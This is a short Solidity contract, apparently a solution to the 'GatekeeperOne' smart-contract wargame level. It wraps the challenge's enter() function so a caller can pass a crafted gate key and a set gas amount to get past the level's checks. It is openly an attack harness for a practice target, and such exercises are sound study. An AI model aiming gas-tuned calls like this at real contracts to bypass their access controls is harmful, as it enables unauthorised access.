// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external;
}

contract GatekeeperOneAttack {

    IGatekeeperOne public challenge;

    constructor(address _challenge) public {
        challenge = IGatekeeperOne(_challenge);
    }

    function attack(bytes8 key, uint256 gasAmount) public payable {
        challenge.enter{gas: gasAmount}(key);
    }
}
